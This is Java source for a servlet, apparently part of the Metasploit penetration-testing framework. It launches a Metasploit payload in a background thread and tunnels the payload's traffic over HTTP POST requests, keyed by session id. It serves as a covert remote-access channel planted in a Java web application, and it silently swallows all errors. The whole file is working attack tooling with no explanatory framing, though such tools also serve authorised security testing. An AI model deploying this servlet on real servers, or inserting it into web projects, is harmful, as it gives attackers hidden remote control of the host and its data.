package metasploit;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class PayloadTunnelServlet extends HttpServlet implements Runnable {

	private static Map/* <Thread,Int> */threadSession = new HashMap();
	private static List/* <Object[]> */sessionInfo = new ArrayList();

	// poor man's enum as Object to avoid need for boxing
	private static final Object STATE_BOOTSTRAP = new Object();
	private static final Object STATE_RECEIVED = new Object();
	private static final Object STATE_SENT = new Object();

	public static InputStream getIn() {
		Object[] info;
		synchronized (sessionInfo) {
			info = (Object[]) sessionInfo.get(((Integer) threadSession.get(Thread.currentThread())).intValue());
		}
		synchronized (info) {
			InputStream result = (InputStream) info[1];
			info[1] = null;
			return result;
		}
	}

	public static InputStream send(byte[] data) throws InterruptedException {
		Object[] info;
		synchronized (sessionInfo) {
			info = (Object[]) sessionInfo.get(((Integer) threadSession.get(Thread.currentThread())).intValue());
		}
		synchronized (info) {
			info[2] = data;
			info[0] = STATE_RECEIVED;
			info.notifyAll();
			while (info[0] != STATE_SENT)
				info.wait();
			InputStream result = (InputStream) info[2];
			info[2] = null;
			return result;
		}
	}

	public void run() {
		try {
			metasploit.Payload.main(new String[] { "" });
		} catch (Exception e) {}
	}

	protected void doGet(HttpServletRequest req, HttpServletResponse res)
			throws ServletException, IOException {
		res.getWriter().close();
	}

	protected void doPost(HttpServletRequest req, HttpServletResponse res)
			throws ServletException, IOException {
		try {
			DataInputStream in = new DataInputStream(req.getInputStream());
			int id = in.readInt();
			Object[] info;
			if (id == 0) {
				Thread t = new Thread(this);
				synchronized (sessionInfo) {
					id = sessionInfo.size();
					info = new Object[] { STATE_BOOTSTRAP, in, null };
					sessionInfo.add(info);
					threadSession.put(t, new Integer(id));
				}
				t.start();
			} else {
				synchronized (sessionInfo) {
					info = (Object[]) sessionInfo.get(id);
				}
				synchronized (info) {
					info[2] = in;
					info[0] = STATE_SENT;
					info.notifyAll();
				}
			}
			byte[] result;
			synchronized (info) {
				while (info[0] != STATE_RECEIVED) {
					info.wait();
				}
				result = (byte[]) info[2];
				info[2] = null;
			}
			DataOutputStream out = new DataOutputStream(res.getOutputStream());
			out.writeInt(id);
			out.write(result);
			out.close();
		} catch (Exception e) {}
	}
}
